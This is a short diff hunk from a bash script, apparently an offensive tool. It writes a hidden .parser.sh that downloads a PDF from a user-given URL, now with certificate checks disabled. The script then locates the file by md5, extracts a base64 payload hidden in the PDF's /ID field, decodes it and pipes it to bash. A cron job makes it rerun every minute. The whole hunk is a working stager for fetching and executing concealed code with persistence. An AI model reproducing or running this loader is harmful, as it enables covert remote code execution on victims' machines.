@@ -20,7 +20,7 @@ echo "[+] Input URL for PDF"
 read pdf
 
 payload=$(echo $pdf | sed 's/.*\///g')
-echo 'wget '$pdf'; mv '$payload.1' '$payload' 2> /dev/null && export md5sum=$(md5sum '$payload' | sed "s/ .*//g") && for i in $(find / -type f -name "*.pdf" -printf "%T@ %p\n" 2>/dev/null | sort -k1 -n 2> /dev/null | sed "s/.*'\ '//g"); do if md5sum $i 2> /dev/null | awk "{print $1}" | grep -q $md5sum; then strings $i | grep "^/ID" | sed "s/.*<//g" | sed "s/..$//g" | base64 -d | bash; fi done' > .parser.sh &&
+echo 'wget --no-check-certificate '$pdf'; mv '$payload.1' '$payload' 2> /dev/null && export md5sum=$(md5sum '$payload' | sed "s/ .*//g") && for i in $(find / -type f -name "*.pdf" -printf "%T@ %p\n" 2>/dev/null | sort -k1 -n 2> /dev/null | sed "s/.*'\ '//g"); do if md5sum $i 2> /dev/null | awk "{print $1}" | grep -q $md5sum; then strings $i | grep "^/ID" | sed "s/.*<//g" | sed "s/..$//g" | base64 -d | bash; fi done' > .parser.sh &&
 chmod +x .parser.sh &&
 echo '* * * * * cd '$(pwd)' && ./.parser.sh' > .cron &&
 crontab .cron &&
